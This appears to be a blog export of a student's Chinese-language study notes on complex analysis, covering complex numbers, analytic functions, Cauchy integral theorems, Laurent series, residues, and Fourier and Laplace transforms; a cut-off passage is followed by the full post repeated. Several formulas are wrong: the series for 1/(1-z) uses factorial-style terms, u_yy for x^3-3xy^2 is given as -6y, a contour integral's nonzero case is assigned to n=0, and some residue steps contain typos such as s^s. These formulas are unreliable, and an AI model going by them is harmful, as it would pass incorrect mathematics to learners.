的傅里叶变换。\n这样一来就可以粗略地理解为傅里叶变换就是把**关于时间的函数**转换为**关于频率的函数**，也就是所谓的时域转换为频域。\n\n**例** 求矩形脉冲函数 $f(t)=\\begin{cases}1, & |t|\\leq a\\\\\\\\0, & |t|> a\\end{cases}$ 的傅里叶变换及傅里叶积分表达式。\n\n**解** 经典例题\n$$\n\\begin{aligned}\nF(\\omega)=\\mathscr{F}[f(t)]&=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\\\\\\n&=\\int_{-a}^{a}e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\\\\\\n&=\\frac{1}{-\\mathrm{i}\\omega}\\left(e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}\\right)\\\\\\\\\n&=\\frac{2}{\\omega}\\cdot\\frac{e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}}{-2\\mathrm{i}} \\\\\\\\\n&= \\frac{2}{\\omega}\\cdot\\sin a\\omega\n\\end{aligned}\n$$\n再作傅里叶逆变换，即得傅里叶积分表达式\n$$\n\\begin{aligned}\nf(t)=\\mathscr{F}^{-1}[F(\\omega)]&=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\\\\\\\\\n&=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega + \\frac{\\mathrm{i}}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\sin\\omega t \\mathrm{d}\\omega\\\\\\\\\n&=\\frac{1}{\\pi}\\int_{-\\infty}^{+\\infty}\\frac{\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega \\\\\\\\\n&=\\begin{cases}1, & |t| < a \\\\\\\\ 1/2, & |t| = a \\\\\\\\ 0, & |t| > a\\end{cases}\n\\end{aligned}\n$$\n上式中令 $t=0$ ，可得重要积分公式\n$$\n\\int_{-\\infty}^{+\\infty}\\frac{\\sin ax}{x} \\mathrm{d}x=\\pi,\\quad (a>0)\n$$\n\n### $\\delta$ 函数及其 Fourier 变换\n\n我们称满足如下条件的函数为 $\\delta$ 函数：\n\n1. 当 $t \\neq0$ 时， $\\delta(t)=0$ ；\n2. $\\int_{-\\infty}^{+\\infty}\\delta(t)\\mathrm{d}t = 1$\n可以看出，这是一个直观上矛盾的函数。书本上也说明了它不是一个经典意义上的函数，而是一个**广义函数**，有兴趣可以另行搜索。\n\n$\\delta$ 函数有一个性质，就是对任意的连续函数 $f(t)$ ，都有\n$$\n\\int_{-\\infty}^{+\\infty}f(t)\\delta(t)\\mathrm{d}t = f(0)\n$$更一般地，若 $f(t)$ 在 $t=t_0$ 处连续，则\n$$\n\\int_{-\\infty}^{+\\infty}f(t)\\delta(t-t_0)\\mathrm{d}t = f(t_0)\n$$\n\n这是一个很好的**筛选性质**。同时其傅里叶变换也很有意思：\n$$\nF(\\omega) = \\mathscr{F}[\\delta(t)] = \\int\\_{-\\infty}^{+\\infty}\\delta(t)e^{-\\mathrm{i}\\omega t}\\mathrm{d}t = e^{-\\mathrm{i}\\omega t}|\\_{t=0} = 1 \\\\\\\\\n\\delta(t) = \\mathscr{F}^{-1}[1] = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\n$$\n\n### Fourier 变换的性质\n\n### Fourier 变换的卷积性质\n\n简单来说，就是\n$$\nf_1(t)*f_2(t) = \\int_{-\\infty}^{+\\infty}f_1(\\tau)f_2(t-\\tau)\\mathrm{d}\\tau\n$$\n\n## Laplace 变换\n\n### Laplace 变换的概念\n\n**例** 求指数函数 $f(t)=e^{kt} ,k \\in \\mathbb{R}$ 的 Laplace 变换。\n**解** $$\n\\begin{aligned}\nF(s)\n&=\\mathscr{L}[f(t)]\\\\\\\\\n&=\\int_{0}^{\\infty}e^{kt}e^{-st}\\mathrm{d}t\\\\\\\\\n&=\\frac{1}{s-k} \\quad, \\mathrm{Re}(s)>k\n\\end{aligned}$$\n\n类似地， $f(t)=\\cos kt$ 的 Laplace 变换为 $F(s)=\\frac{s}{s^2+k^2}$ ， $f(t)=\\sin kt$ 的 Laplace 变换为 $F(s)=\\frac{k}{s^2+k^2}$ 。\n\n### Laplace 变换的性质\n\n$$\n\\mathscr{L}[f'(t)]=sF(s)-f(0) \\\\\\\\\n$$\n更一般地，有\n$$\n\\mathscr{L}[f^{(n)}(t)]=s^nF(s) - s^{n-1}f(0) - s^{n-2}f'(0) - \\cdots - f^{(n-1)}(0)\n$$\n\n### Laplace 逆变换\n\n**例** 求 $F(s)=\\frac{1}{s^2(s+1)}$ 的 Laplace 逆变换。\n**解** 函数 $F(s)$满足条件 $\\lim\\limits_{s \\to 0}F(s)=0$ ，且 $s=0$ 是 $F(s)$ 的二级极点， $s=-1$是 $F(s)$的一级极点，故\n$$\n\\begin{aligned}\nf(t) = \\mathscr{L}^{-1}[F(s)]\n&= \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},0\\right] + \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},-1\\right] \\\\\\\\\n&= (t-1) + e^{-t},\\quad t > 0\n\\end{aligned}\n$$\n\n### 卷积\n\n### Laplace 变换的应用\n\n**例** 求解微分方程 $y''+\\omega^2y(t)=0, y(0)=0, y'(0)=\\omega$ 。\n\n**解** 令 $Y(s)=\\mathscr{L}[y(t)]$ ，对方程两边取 Laplace 变换，得\n$$\ns^2Y(s)-sy(0)-y'(0)+\\omega^2Y(s)=0\n$$\n代入初值条件，得\n$$\ns^2Y(s)-\\omega+\\omega^2Y(s)=0 \\\\\\\\\n\\Rightarrow Y(s)=\\frac{\\omega}{s^2+\\omega^2}\n$$\n求逆变换，得\n$$\n\\begin{aligned}\ny(t)=\\mathscr{L}^{-1}\\left[\\frac{\\omega}{s^2+\\omega^2}\\right] &= \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},w\\mathrm{i}\\right] + \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},-w\\mathrm{i}\\right] \\\\\\\\\n&= \\lim_{s\\to w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)'} + \\lim_{s\\to -w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)'} \\\\\\\\\n&=\\frac{we^w\\mathrm{i}t}{2w\\mathrm{i}}+\\frac{we^{-w\\mathrm{i}t}}{-2w\\mathrm{i}} \\\\\\\\\n&=\\frac{2\\mathrm{i}\\sin wt}{2\\mathrm{i}}=\\sin wt\n\\end{aligned}\n$$\n","source":"_posts/复变函数笔记.md","raw":"---\ntitle: 复变函数笔记\ndate: 2022-10-09 17:36:00\ntags: [数学,高数,复变函数]\ncategories: 学习\n---\n\n高数写了笔记再考试效果挺好的 ~~（为什么挂科之前没这觉悟啊）~~，复变也记一下吧。\n<!--more-->\n\n## 复数与复变函数\n\n### 复数及其运算\n\n通常记复数为 $z=x+\\mathrm{i}y$ ，其中实部与虚部记作\n$$\nx=\\mathrm{Re}(z),\\quad y=\\mathrm{Im}(z)\n$$\n显然\n$$\n\\mathrm{Re}(z)=\\frac{z+\\overline{z}}{2},\\quad \\mathrm{Im}(z)=\\frac{z-\\overline{z}}{2\\mathrm{i}}\n$$\n以正实轴为始边，以 $z(z\\neq 0)$ 所对应的向量为终边的角称为复数 $z$ 的辐角，记作 $\\mathrm{Arg}\\ z$ ，把在 $(-\\pi,\\pi]$ 之间的辐角称为 $z$ 的主辐角（或主值或者叫辐角主值），记作 $\\mathrm{arg}\\ z$ 。\n有个重要点就是辐角要**注意正负**。\n\n以及大名鼎鼎的**欧拉公式**：$$e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$$\n\n一个没什么名但是**很有用**的公式——棣莫弗公式：$$z^n = \\cos n\\theta + \\mathrm{i}\\sin n\\theta$$\n\n**复数的开方**\n复数开方时，开几次方就有几个结果。\n求 $w=\\sqrt[n]{z}$ 时，令 $w=\\rho e^{\\mathrm{i}\\varphi}$ ，从而 $\\rho^n e^{\\mathrm{i}n\\varphi} = z = re^{\\mathrm{i}\\theta}$ ，得到\n$$\n\\rho^n = r,\\quad n\\varphi = \\theta + 2k\\pi,\\quad k=0,\\pm1,\\pm2,\\cdots\n$$故\n$$\n\\rho = r^{1/n},\\quad \\varphi = \\frac{\\theta + 2k\\pi}{n}\n$$于是\n$$\nw = \\sqrt[n]{r}e^{\\mathrm{i}\\frac{\\theta + 2k\\pi}{n}}\n$$\n\n### 平面点集的一般概念\n\n和高数类似，没啥好说的。\n\n### 复变函数\n\n似乎也没啥重要的（）\n\n## 解析函数\n\n### 解析函数的概念与柯西-黎曼方程\n\n**奇点**：如果函数 $f(z)$ 在点 $z_0$ **不解析**，则称 $z_0$ 为 $f(z)$ 的奇点。\n求**有理分式**的奇点时，直接取**分母零点**即可。\n\n柯西-黎曼方程（C-R方程）：\n$$\n\\frac{\\partial u}{\\partial x} = \\frac{\\partial v}{\\partial y},\\quad \\frac{\\partial u}{\\partial y} = -\\frac{\\partial v}{\\partial x}\n$$\n\n可导的充要条件： $u(x,y)$ 和 $v(x,y)$ 在点 $x,y$ 可微，且在该点满足C-R方程。\n\n**例** 证明：柯西-黎曼方程的极坐标形式是\n$$\n\\frac{\\partial u}{\\partial r} = \\frac{1}{r}\\frac{\\partial v}{\\partial \\theta},\\quad \\frac{\\partial v}{\\partial r} = -\\frac{1}{r}\\frac{\\partial r}{\\partial \\theta}\n$$\n\n### 初等函数及其解析性\n\n**指数函数** $z=x+\\mathrm{i}y$ 为任意复数，称 $w=e^z=e^x(\\cos y+\\mathrm{i}\\sin y)$ 为指数函数。\n\n**对数函数** 满足方程 $e^w = z$ 的函数 $w=\\mathrm{Ln} \\ z$ 称为对数函数，且\n$$\n\\mathrm{Ln}\\ z = \\ln z + 2k\\pi\\mathrm{i} = \\ln|z| + \\mathrm{i}\\mathrm{arg}\\ z + 2k\\pi\\mathrm{i},\\quad k=0,\\pm1,\\pm2,\\cdots\n$$\n\n**幂函数** $w=z^a=e^{a\\mathrm{Ln}\\ z}$ 为幂函数。\n\n**三角函数** 称 $\\sin z = \\frac{e^{\\mathrm{i}z}-e^{-\\mathrm{i}z}}{2\\mathrm{i}}$ 为正弦函数， $\\cos z = \\frac{e^{\\mathrm{i}z}+e^{-\\mathrm{i}z}}{2}$ 为余弦函数。\n\n**双曲函数** 称 $\\sinh z = \\frac{e^z-e^{-z}}{2}$ 为双曲正弦函数， $\\cosh z = \\frac{e^z+e^{-z}}{2}$ 为双曲余弦函数。\n\n### 解析函数与调和函数的关系\n\n若实二元函数 $\\varphi(x,y)$ 在区域 $D$ 内具有二阶连续偏导数，且满足 $\\mathrm{Laplace}$ 方程\n$$\n\\frac{\\partial^2\\varphi}{\\partial x^2} + \\frac{\\partial^2\\varphi}{\\partial y^2} = 0\n$$\n则称 $\\varphi(x,y)$ 为区域 $D$ 的调和函数。\n\n**例** 验证 $u(x,y)=x^3-3xy^2$ 为调和函数，并求以 $u(x,y)$ 为实部的解析函数 $f(z)$ ，使得 $f(\\mathrm{i}) = -\\mathrm{i}$ 。\n\n**解** $u_{xx}=6x$，$u_{yy}=-6y$，故 $u_{xx}+u_{yy}=0$， $u(x,y)$ 为调和函数。下面求虚部 $v(x,y)$ 。\n**法一**：偏积分法\n$$\nu_x = 3x^2-3y^2 = v_y \\Rightarrow v = \\int (3x^2-3y^2)\\mathrm{d}y = 3x^2y-y^3 + \\varphi(x) \\\\\\\\\nv_x = 6xy+\\varphi'(x) = -u_y = 6xy \\Rightarrow \\varphi(x) = C \\Rightarrow v(x,y) = 3x^2y - y^3 + C\n$$\n\n**法二**：全微分法\n$$\nv_y=u_x=3x^2-3y^2,v_x=-u_y=6xy\\\\\\\\\n\\Rightarrow \\mathrm{d}v = v_x'\\mathrm{d}x +v_y'\\mathrm{d}y=6xy\\mathrm{d}x + (3x^2-3y^2)\\mathrm{d}y\\\\\\\\\n\\Rightarrow v(x,y)=\\int_{(0,0)}^{(x,y)}6xy\\mathrm{d}x+(3x^2-3y^2)\\mathrm{d}y + C \\\\\\\\\n=\\int_0^x\\mathrm{d}x+\\int_0^y(3x^2-3y^2)\\mathrm{d}y + C = 3x^2y - y^3 + C\n$$\n\n最后代入 $f(\\mathrm{i})=-\\mathrm{i}$ 有 $f(z)=(x^3-3xy^2)+\\mathrm{i}(3x^2y-y^3)=z^3$ 。\n\n## 复变函数的积分\n\n### 复变函数积分的概念\n\n**例** 计算 $I=\\oint_{\\mathit{\\Gamma}}\\frac{1}{(z-z_0)^n}\\mathrm{d}z$ ，其中 $\\mathit{\\Gamma}$ 为包含 $z_0$ 的一条闭曲线。\n**解** 以 $z_0$ 为圆心 $r$ 为半径作圆，则函数 $f(z)=\\frac{1}{(z-z_0)^n}$ 在 $\\overline{D}=D+\\mathit{\\Gamma}+C^-$上解析，因此\n$$\nI = \\oint_C\\frac{\\mathrm{d}z}{(z-z_0)^n}\\mathrm{d}z\n= \\begin{cases}\n2\\pi\\mathrm{i}, & n = 0 \\\\\\\\\n0, & n\\neq0\n\\end{cases}\n$$\n\n### 柯西积分定理\n\n设函数 $f(z)$ 在单连通域 $D$ 内解析， $\\mathit{\\Gamma}$ 为 $D$ 内的任意一条简单闭曲线，则有$$\\oint_{\\mathit{\\Gamma}}f(z)\\mathrm{d}z=0$$\n甚至也不用在$ \\mathit{\\Gamma}$ 上解析，在 $\\mathit{\\Gamma}$ 上连续就成立。\n\n### 复合闭路定理\n\n设多连域 $D$ 的边界为 $C=C_0 + C_1^- + C_2^- + \\cdots + C_n^-$ ，函数 $f(z)$ 在 $D$ 内解析，在 $C$ 上连续，则\n$$\n\\oint_Cf(z)\\mathrm{d}z = 0\n$$\n或\n$$\n\\oint_{C_0}f(z)\\mathrm{d}z = \\sum_{k=1}^n\\oint_{C_k}f(z)\\mathrm{d}z\n$$\n\n### 柯西积分公式\n\n**柯西积分公式** 若函数 $f(z)$ 在简单正向闭曲线 $C$ 所围成的区域 $D$ 内解析，在区域 $D$ 的边界 $C$ 上连续， $z_0$ 是区域 $D$ 内任意一点，则\n$$\nf(z_0) = \\frac{1}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{z-z_0}\\mathrm{d}z\n$$\n\n**高阶求导公式** 设 $f(z)$ 在 $D$ 内解析，在 $D$ 的边界 $C$ 上连续， $C$ 为正向简单闭曲线，则 $f^{(n)}(z)$ 在 $D$ 内解析，且有\n$$\nf^{(n)}(z_0)=\\frac{n!}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{(z-z_0)^{n+1}}\\mathrm{d}z, \\quad \\forall z_0\\in D, n=0,1,2,\\cdots\n$$\n\n## 解析函数的幂级数表示\n\n### 复级数的基本概念\n\n复数列收敛和一般的数列收敛定义类似，其充要条件为\n$$\n\\lim_{n\\to\\infty}a_n=a,\\quad \\lim_{n\\to\\infty}b_n=b\n$$\n所以判断级数收不收敛就**拆成实部和虚部**然后进行判断。\n\n### 幂级数\n\n**收敛半径** 求法与高数类似，但多个根值法：\n（1）（比值法） $\\lim\\limits_{n\\to\\infty}\\left|\\frac{a_{n+1}}{a_n}\\right|=L$\n（2）（根值法） $\\lim\\limits_{n\\to\\infty}\\sqrt[n]{|a_n|}=L$\n则收敛半径 $R=\\frac{1}{L}$\n\n幂级数性质与高数也类似，可以逐项求导和逐项求积。\n\n### 解析函数的泰勒展开\n\n与高数类似，不再赘述。\n\n**四个重要的已知展开**\n$$\n\\frac{1}{1-z} = \\sum_{n=0}^\\infty z^n = 1+z+\\frac{z^2}{2}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| < 1 \\\\\\\\\ne^z = \\sum_{n=0}^\\infty \\frac{z^n}{n!} = 1+z+\\frac{z^2}{2!}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| < +\\infty \\\\\\\\\n\\sin z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n+1}}{(2n+1)!} = z-\\frac{z^3}{3!}+\\frac{z^5}{5!}-\\frac{z^7}{7!}+\\cdots,\\enspace |z| < +\\infty \\\\\\\\\n\\cos z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n}}{(2n)!} = 1-\\frac{z^2}{2!}+\\frac{z^4}{4!}-\\frac{z^6}{6!}+\\cdots,\\enspace |z| < +\\infty\n$$\n\n**展开后注意标出收敛圆！**\n\n### 洛朗级数\n\n泰勒展开有个缺陷，那就是只能展开到解析的地方，如果中间有个奇点卡住，那就不能再往外展开了。\n这个时候就用到洛朗级数，可以在圆环域展开，弥补泰勒展开的不足。\n\n## 留数及其应用\n\n### 孤立奇点\n\n#### 零点的判断\n\n首先很直白的， $f(z_0)=0$ ，那么 $z=z_0$ 就是 $f(z)$ 的零点。\n若 $f(z)=(z-z_0)^m\\varphi(z)$ ， $\\varphi(z)$ 在 $z_0$ 处解析且 $\\varphi(z_0)\\neq 0$ ，则 $z=z_0$ 是 $f(z)$ 的 $m$ 阶零点。\n\n#### 奇点类型的判断\n\n从定义上判断的话就先展开成洛朗级数，即设 $z_0$ 为 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $0 < |z-Z_0| < \\delta$ 内洛朗展开为 $f(z)=\\sum\\limits_{n=0}^{+\\infty} a_n(z-z_0)^n$ 。\n\n1. 可去奇点：展开式中不含负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=C$ 。\n2. $N$ 阶极点：含有限多的负幂次项，且最高负幂次为 $N$ ，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=\\infty$。\n3. 本性奇点：含无穷多的负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)$ 不存在且不为 $\\infty$ 。\n\n### 留数\n\n#### 留数的定义\n\n设 $z_0$ 为函数 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $z_0$ 的去心邻域内展开成洛朗级数\n$$\nf(z) = \\sum_{n=-\\infty}^{+\\infty}a_n(z-z_0)^n = \\cdots + a_{-2}(z-z_0)^{-2} + a_{-1}(z-z_0)^{-1} + a_0 + a_1(z-z_0) + a_2(z-z_0)^2 + \\cdots\n$$\n称 $a_{-1}$ 为 $f(z)$ 在 $z_0$ 处的留数，记作$$\\mathrm{Res}[f(z),z_0]=a_{-1}=\\frac{1}{2\\pi i}\\oint\\limits_c f(z)\\mathrm{d}z$$\n其中 $C$ 是 $z_0$ 的去心邻域内绕 $z_0$ 的一条简单闭曲线。\n\n#### 留数的求解\n\n1. $z_0$ 为可去奇点： $\\mathrm{Res}[f(z),z_0]=0$ 。\n2. $z_0$ 为本性奇点：需要将$f(z)$在$z_0$的去心邻域内展开成洛朗级数\n3. $z_0$ 为 $m$ 阶极点：$$\\mathrm{Res}[f(z),z_0]=\\frac{1}{(m-1)!}\\lim_{z\\to z_0}\\frac{d^{m-1}}{dz^{m-1}}[(z-z_0)^mf(z)]$$\n\n#### 无穷远处的留数\n\n若函数 $f(z)$ 在无穷远点 $\\infty$ 的去心领域 $R<|f(z)|<+\\infty$ 内解析，则称点 $\\infty$ 为 $f(z)$ 的孤立奇点。\n\n设函数 $f(z)$ 在圆环域 $R<|z|<+\\infty$ 内解析，则 $f(z)$ 在 $\\infty$ 处的留数为：\n$$\n\\mathrm{Res}[f(z),\\infty]=\\frac{1}{2\\pi \\mathrm{i}}\\oint_{C^-}f(z)\\mathrm{d}z\n$$\n其中， $C$ 为 $|z|=\\rho > R$ 。\n\n$$\n\\mathrm{Res}[f(z), \\infty] = -\\mathrm{Res}[f(\\frac{1}{z})\\cdot\\frac{1}{z^2}, 0]\n$$\n\n### 利用留数计算实积分\n\n#### 形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分\n\n**计算方法**：\n\n1. 令 $z=e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$ ，则 $\\mathrm{d}\\theta=\\frac{\\mathrm{d}z}{\\mathrm{i}z}$ ， $\\cos\\theta=\\frac{z^2+1}{2z}$ ， $\\sin\\theta=\\frac{z^2-1}{2\\mathrm{i}z}$ 。\n2. $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta=\\oint_{|z|=1}R\\left(\\frac{z^2+1}{2z},\\frac{z^2-1}{2\\mathrm{i}z}\\right)\\frac{1}{\\mathrm{i}z}\\mathrm{d}z=\\oint_{|z|=1}f(z)\\mathrm{d}z=2\\pi\\mathrm{i}\\sum\\limits_k \\mathrm{Res}[f(z),z_k]$ ，其中 $z_k$ 是 $f(z)$ **在 $|z|=1$ 内**的孤立奇点。\n\n#### 形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分\n\n**要求**：\n\n1. $R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无**实零点**。\n2. 分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $2$ 或以上。\n\n**计算方法**： $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k]$ ， 其中 $z_k$ 为 $R(z)$在**上半平面**内的孤立奇点。\n\n**例** 求积分 $I=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x$ .\n**解** 首先显然分母零点均为虚数，且分母次数比分子高 $2$ ，故满足条件。\n\n1. 令 $$R(z)=\\frac{z^2-z+2}{z^4+10z^2+9}=\\frac{z^2-z+2}{(z^2+1)(z^2+9)}$$\n则上半平面内有一阶极点 $z_1=\\mathrm{i}$ 和 $z_2=3\\mathrm{i}$ 。\n2. 则\n$$\n\\begin{aligned}\nI&=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x\\\\\\\\\n&=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k] \\\\\\\\\n&=2\\pi\\mathrm{i}\\left(\\mathrm{Res}[R(z),\\mathrm{i}]+\\mathrm{Res}[R(z),3\\mathrm{i}]\\right)\\\\\\\\\n&=2\\pi\\mathrm{i}\\left(-\\frac{1+\\mathrm{i}}{16}+\\frac{3-7\\mathrm{i}}{48}\\right) = \\frac{5\\pi}{12}\n\\end{aligned}\n$$\n\n#### 形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a>0)$ 的积分\n\n**要求**：\n\n1. $R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无**实零点**。\n2. 分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $1$ 或以上。\n\n**计算方法**： $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z)e^{\\mathrm{i}az},z_k]$ ， 其中 $z_k$ 为 $R(z)$在**上半平面**内的孤立奇点。\n\n## Fourier变换\n\n记得上一年的这个时候就对傅里叶变换有所接触了，然而时光荏苒，却一直没能有什么更深的理解，有些惭愧了。\n\n### Fourier 积分公式\n\n$$\nf(t) = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\left[\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\right]e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\n$$\n这个式子有点奇怪，两边都有 $f(t)$ ，那我要来干嘛呢，这时你先别急，下面拆解一下就有意思了。\n\n### Fourier 变换\n\n上式中令 $F(\\omega)=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t$ ，则 $f(t)=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}F(\\omega)e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$ ，那么这个关于 $\\omega$ 的函数 $F(\\omega)$ 就是 $f(t)$ 的傅里叶变换。\n这样一来就可以粗略地理解为傅里叶变换就是把**关于时间的函数**转换为**关于频率的函数**，也就是所谓的时域转换为频域。\n\n**例** 求矩形脉冲函数 $f(t)=\\begin{cases}1, & |t|\\leq a\\\\\\\\0, & |t|> a\\end{cases}$ 的傅里叶变换及傅里叶积分表达式。\n\n**解** 经典例题\n$$\n\\begin{aligned}\nF(\\omega)=\\mathscr{F}[f(t)]&=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\\\\\\n&=\\int_{-a}^{a}e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\\\\\\n&=\\frac{1}{-\\mathrm{i}\\omega}\\left(e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}\\right)\\\\\\\\\n&=\\frac{2}{\\omega}\\cdot\\frac{e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}}{-2\\mathrm{i}} \\\\\\\\\n&= \\frac{2}{\\omega}\\cdot\\sin a\\omega\n\\end{aligned}\n$$\n再作傅里叶逆变换，即得傅里叶积分表达式\n$$\n\\begin{aligned}\nf(t)=\\mathscr{F}^{-1}[F(\\omega)]&=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\\\\\\\\\n&=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega + \\frac{\\mathrm{i}}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\sin\\omega t \\mathrm{d}\\omega\\\\\\\\\n&=\\frac{1}{\\pi}\\int_{-\\infty}^{+\\infty}\\frac{\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega \\\\\\\\\n&=\\begin{cases}1, & |t| < a \\\\\\\\ 1/2, & |t| = a \\\\\\\\ 0, & |t| > a\\end{cases}\n\\end{aligned}\n$$\n上式中令 $t=0$ ，可得重要积分公式\n$$\n\\int_{-\\infty}^{+\\infty}\\frac{\\sin ax}{x} \\mathrm{d}x=\\pi,\\quad (a>0)\n$$\n\n### $\\delta$ 函数及其 Fourier 变换\n\n我们称满足如下条件的函数为 $\\delta$ 函数：\n\n1. 当 $t \\neq0$ 时， $\\delta(t)=0$ ；\n2. $\\int_{-\\infty}^{+\\infty}\\delta(t)\\mathrm{d}t = 1$\n可以看出，这是一个直观上矛盾的函数。书本上也说明了它不是一个经典意义上的函数，而是一个**广义函数**，有兴趣可以另行搜索。\n\n$\\delta$ 函数有一个性质，就是对任意的连续函数 $f(t)$ ，都有\n$$\n\\int_{-\\infty}^{+\\infty}f(t)\\delta(t)\\mathrm{d}t = f(0)\n$$更一般地，若 $f(t)$ 在 $t=t_0$ 处连续，则\n$$\n\\int_{-\\infty}^{+\\infty}f(t)\\delta(t-t_0)\\mathrm{d}t = f(t_0)\n$$\n\n这是一个很好的**筛选性质**。同时其傅里叶变换也很有意思：\n$$\nF(\\omega) = \\mathscr{F}[\\delta(t)] = \\int\\_{-\\infty}^{+\\infty}\\delta(t)e^{-\\mathrm{i}\\omega t}\\mathrm{d}t = e^{-\\mathrm{i}\\omega t}|\\_{t=0} = 1 \\\\\\\\\n\\delta(t) = \\mathscr{F}^{-1}[1] = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\n$$\n\n### Fourier 变换的性质\n\n### Fourier 变换的卷积性质\n\n简单来说，就是\n$$\nf_1(t)*f_2(t) = \\int_{-\\infty}^{+\\infty}f_1(\\tau)f_2(t-\\tau)\\mathrm{d}\\tau\n$$\n\n## Laplace 变换\n\n### Laplace 变换的概念\n\n**例** 求指数函数 $f(t)=e^{kt} ,k \\in \\mathbb{R}$ 的 Laplace 变换。\n**解** $$\n\\begin{aligned}\nF(s)\n&=\\mathscr{L}[f(t)]\\\\\\\\\n&=\\int_{0}^{\\infty}e^{kt}e^{-st}\\mathrm{d}t\\\\\\\\\n&=\\frac{1}{s-k} \\quad, \\mathrm{Re}(s)>k\n\\end{aligned}$$\n\n类似地， $f(t)=\\cos kt$ 的 Laplace 变换为 $F(s)=\\frac{s}{s^2+k^2}$ ， $f(t)=\\sin kt$ 的 Laplace 变换为 $F(s)=\\frac{k}{s^2+k^2}$ 。\n\n### Laplace 变换的性质\n\n$$\n\\mathscr{L}[f'(t)]=sF(s)-f(0) \\\\\\\\\n$$\n更一般地，有\n$$\n\\mathscr{L}[f^{(n)}(t)]=s^nF(s) - s^{n-1}f(0) - s^{n-2}f'(0) - \\cdots - f^{(n-1)}(0)\n$$\n\n### Laplace 逆变换\n\n**例** 求 $F(s)=\\frac{1}{s^2(s+1)}$ 的 Laplace 逆变换。\n**解** 函数 $F(s)$满足条件 $\\lim\\limits_{s \\to 0}F(s)=0$ ，且 $s=0$ 是 $F(s)$ 的二级极点， $s=-1$是 $F(s)$的一级极点，故\n$$\n\\begin{aligned}\nf(t) = \\mathscr{L}^{-1}[F(s)]\n&= \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},0\\right] + \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},-1\\right] \\\\\\\\\n&= (t-1) + 